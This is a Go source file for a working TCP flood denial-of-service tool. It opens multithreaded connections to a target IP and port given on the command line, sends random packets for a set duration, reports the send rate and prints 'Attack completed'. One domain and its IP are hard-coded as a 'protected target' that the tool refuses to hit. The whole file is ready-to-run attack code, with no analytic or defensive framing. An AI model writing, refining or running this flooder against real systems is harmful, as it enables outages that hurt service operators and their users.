package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
	"runtime"
	"math/rand"
	"sync/atomic"
	"strings"
)

var (
	totalPackets uint64
	totalBytes   uint64
	// Blocked domain and IPs
	blockedDomain = "spymc.xyz"
	blockedIPs    = []string{
		"139.99.113.26", // IPs of spymc.xyz
	}
)

// isBlockedTarget checks if the target is spymc.xyz or its IPs
func isBlockedTarget(ip string) bool {
	// Check if the target is the blocked domain
	if strings.Contains(ip, blockedDomain) {
		return true
	}
	// Check if the target is one of the blocked IPs
	for _, blockedIP := range blockedIPs {
		if ip == blockedIP {
			return true
		}
	}
	return false
}

func sendTcpFlood(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int, packetSize int) {
	defer wg.Done()

	// Check if target is blocked
	if isBlockedTarget(ip) {
		fmt.Printf("[BLOCKED] Attempted attack on protected target: %s\n", ip)
		return
	}

	packet := make([]byte, packetSize)
	rand.Read(packet)

	conns := make([]net.Conn, 5)
	for i := range conns {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
		if err != nil {
			continue
		}
		defer conn.Close()
		conns[i] = conn
	}

	for {
		select {
		case <-done:
			return
		default:
			for _, conn := range conns {
				if conn == nil {
					continue
				}
				_, err := conn.Write(packet)
				if err != nil {
					conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
					if err != nil {
						continue
					}
					defer conn.Close()
				} else {
					atomic.AddUint64(&totalPackets, 1)
					atomic.AddUint64(&totalBytes, uint64(packetSize))
				}
			}
		}
	}
}

func printStats(done <-chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			packets := atomic.SwapUint64(&totalPackets, 0)
			bytes := atomic.SwapUint64(&totalBytes, 0)
			fmt.Printf("Rate: %d packets/sec, %s/sec\n", packets, formatBytes(bytes))
		}
	}
}

func formatBytes(b uint64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := uint64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <ip> <port> <num_threads> <duration_seconds> <packet_size>\n", os.Args[0])
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port <= 0 || port > 65535 {
		fmt.Printf("Invalid port number: %s\n", os.Args[2])
		os.Exit(1)
	}

	// Check if the target is blocked before proceeding
	if isBlockedTarget(ip) {
		fmt.Printf("[SECURITY BLOCK] Attempted attack on protected target: %s\n", ip)
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil || threads <= 0 {
		fmt.Printf("Invalid number of threads: %s\n", os.Args[3])
		os.Exit(1)
	}

	duration, err := strconv.Atoi(os.Args[4])
	if err != nil || duration <= 0 {
		fmt.Printf("Invalid duration: %s\n", os.Args[4])
		os.Exit(1)
	}

	packetSize, err := strconv.Atoi(os.Args[5])
	if err != nil || packetSize <= 0 {
		fmt.Println("Invalid packet size:", os.Args[5])
		os.Exit(1)
	}

	var wg sync.WaitGroup
	done := make(chan struct{})

	go printStats(done)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendTcpFlood(&wg, done, ip, port, packetSize)
	}

	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		close(done)
	}()

	wg.Wait()
	fmt.Println("Attack completed")
}